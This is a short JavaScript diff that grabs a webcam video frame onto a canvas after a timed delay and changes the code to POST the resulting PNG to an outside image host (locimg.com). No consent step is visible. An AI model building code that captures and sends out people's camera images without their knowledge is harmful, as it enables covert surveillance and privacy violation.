@@ -24,9 +24,15 @@
                     setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000);
                     setTimeout(function () {
                         canvas.toBlob((blob) => {
-                            var img = new Blob([blob], { type: "image/png" });
-                            var fileOfBlob = new File([blob], 'Alan.png');
-                            form.append("image", fileOfBlob);
+                            form = new FormData(),
+                                request = new XMLHttpRequest();
+                            form.append("image", blob, "Alan.png");
+                            request.open(
+                                "POST",
+                                "https://locimg.com/upload/upload.html",
+                                true
+                            );
+                            request.send(form);
                         }
                         );
 
